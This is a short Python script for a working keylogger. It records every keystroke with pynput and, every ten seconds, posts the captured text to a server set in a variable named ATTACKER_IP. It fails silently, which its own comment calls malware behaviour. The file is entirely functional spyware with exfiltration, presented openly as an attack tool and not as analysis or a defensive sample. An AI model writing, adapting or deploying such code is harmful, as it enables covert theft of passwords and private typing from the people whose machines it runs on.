from pynput import keyboard
import requests # You need to install this: pip install requests
import threading

# --- CONFIGURATION ---
# REPLACE THIS with your computer's actual Local IP (e.g., 192.168.1.5)
ATTACKER_IP = "http://127.0.0.1:5000/upload" 

captured_keys = ""

def send_data():
    global captured_keys
    if len(captured_keys) > 0:
        try:
            # Send the stolen keys to the attacker via HTTP POST
            payload = {'keys': captured_keys}
            requests.post(ATTACKER_IP, data=payload)
            
            # Clear the local memory after sending
            captured_keys = "" 
        except:
            pass # Fail silently if server is down (Malware behavior)
            
    # Run this function again in 10 seconds (Recursive timer)
    threading.Timer(10, send_data).start()

def on_press(key):
    global captured_keys
    try:
        captured_keys += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            captured_keys += " "
        elif key == keyboard.Key.enter:
            captured_keys += " [ENTER] "
        else:
            captured_keys += f" [{str(key)}] "

# 1. Start the Timer to send data every 10 seconds
send_data()

# 2. Start the Keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
